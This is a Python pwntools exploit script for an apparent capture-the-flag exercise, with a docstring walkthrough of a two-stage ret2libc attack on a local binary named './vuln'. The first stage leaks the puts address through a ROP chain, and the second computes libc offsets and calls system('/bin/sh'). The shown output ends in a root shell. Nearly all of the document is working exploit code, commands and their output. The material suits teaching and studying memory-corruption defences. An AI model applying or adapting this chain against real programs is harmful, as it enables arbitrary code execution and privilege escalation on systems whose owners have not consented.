#!/usr/bin/env python

"""

To pwn this exercise we need to write an exploit that leaks some information to get addresses of useful
functions like system.

In a first istance we see checksec:
    CANARY    : disabled
    FORTIFY   : disabled
    NX        : ENABLED
    PIE       : disabled
    RELRO     : Partial
and we understand that there is ASLR and we can't execute stuff from the stack.

Then we can check the plt functions available and we see them as follow:

    0x0000000000401000  _init
	0x0000000000401030  puts@plt
	0x0000000000401040  gets@plt
	0x0000000000401050  _start
	0x0000000000401080  _dl_relocate_static_pie
	0x0000000000401090  deregister_tm_clones
	0x00000000004010c0  register_tm_clones
	0x0000000000401100  __do_global_dtors_aux
	0x0000000000401130  frame_dummy
	0x0000000000401132  main
	0x0000000000401160  __libc_csu_init
	0x00000000004011c0  __libc_csu_fini
	0x00000000004011c4  _fini

There is puts@plt function that maybe we could exploit to get our libc offset.

Let's check the junk size through pattern_* and we see that 40 bytes are enough to overwrite
the RIP address.

So we are in a first stage and we need three addresses to exploit in order to leak the address we
choose:
	1. a 'pop rdi ; ret' gadget since we are into a x64 linux environment and we need to send a parameter to puts@plt
	2. the puts@GLIBC address (this is our parameter)
	3. puts@plt (the function we want to call)
	4. main function address: this is important because we will not terminate the program execution to avoid ASLR actions.


1. POP RDI ; RET
# ROPgadget --binary vuln | grep 'pop rdi ; ret' 
	0x00000000004011bb : pop rdi ; ret

2. puts@GLIBC
# objdump -j .plt -d vuln | grep puts
	0000000000401030 <puts@plt>:
	401030:	ff 25 e2 2f 00 00    	jmpq   *0x2fe2(%rip)        # 404018 <puts@GLIBC_2.2.5>


3. puts@plt: I used to read symbols from gdb through 'info functions' as you can see above.
    0x0000000000401030  puts@plt


4. same as 3
	0x0000000000401132  main



This is enough to solve our first stage, we will see the puts address leaked and main() called again.

We can unpack our information leaked to read that and we need unpacking in order to use this address to calculate
at runtime the addresses we need to call system@@GLIBC.
First of all we need to do a subtraction to get our offset that we will use to calculate the other addresses we need:
	offset = leaked_puts - libc_puts
where I found libc_puts through readelf:
# readelf -s libc.so.6 | grep puts
    194: 0000000000074040   429 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
    426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5 # THIS ONE!
    501: 00000000000fefe0  1241 FUNC    GLOBAL DEFAULT   14 putspent@@GLIBC_2.2.5
    685: 0000000000100ae0   697 FUNC    GLOBAL DEFAULT   14 putsgent@@GLIBC_2.10
    1154: 0000000000072af0   338 FUNC    WEAK   DEFAULT   14 fputs@@GLIBC_2.2.5
    1698: 0000000000072af0   338 FUNC    GLOBAL DEFAULT   14 _IO_fputs@@GLIBC_2.2.5
    2336: 000000000007cd00   151 FUNC    WEAK   DEFAULT   14 fputs_unlocked@@GLIBC_2.2.5

Now we can calculate our system and /bin/sh addresses as follow:
# readelf -s libc.so.6 | grep system
    235: 0000000000129d20    99 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@@GLIBC_2.2.5
    613: 0000000000046ff0    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE
    1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5 # THIS ONE!

libc_system = p64(0x46ff0 + offset)

# strings -a -t x libc.so.6  | grep /bin/sh
    183cee /bin/sh

bin_sh_string = p64(0x183cee + offset)


# ./exploit.py

	[+] Starting local process './vuln': pid 5898
	[+] puts@got leaked: 0x7fb4b97eb040
	[+] system() :0x7fb4b97bdff0
	[+] /bin/sh : 0x7fb4b98facee
	[*] Switching to interactive mode


	$ id
	uid=0(root) gid=0(root) gruppi=0(root)


resource: https://tasteofsecurity.com/security/ret2libc-unknown-libc/

"""


from pwn import *

p = process("./vuln")

junk = "A" * 40


rdi_gadget = p64(0x4011bb) # pop rdi ; ret
puts_got = p64(0x404018) # puts@GLIBC_2.2.5
puts_plt = p64(0x401030) 
main = p64(0x401132) 

buf = ""
buf += junk
buf += rdi_gadget
buf += puts_got
buf += puts_plt
buf += main

p.sendlineafter("ROP.", buf)

p.recvline()
p.recvline()

libc_puts = 0x74040
leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
offset = leaked_puts - libc_puts

bin_sh_string = p64(0x183cee + offset)
libc_system = p64(0x46ff0 + offset)

log.success("puts@got leaked: " + hex(leaked_puts))
log.success("system() :" + hex(u64(libc_system)))
log.success("/bin/sh : " + hex(u64(bin_sh_string)))


buf = junk
buf += rdi_gadget
buf += bin_sh_string
buf += libc_system


p.sendlineafter("ROP.", buf)


p.interactive()




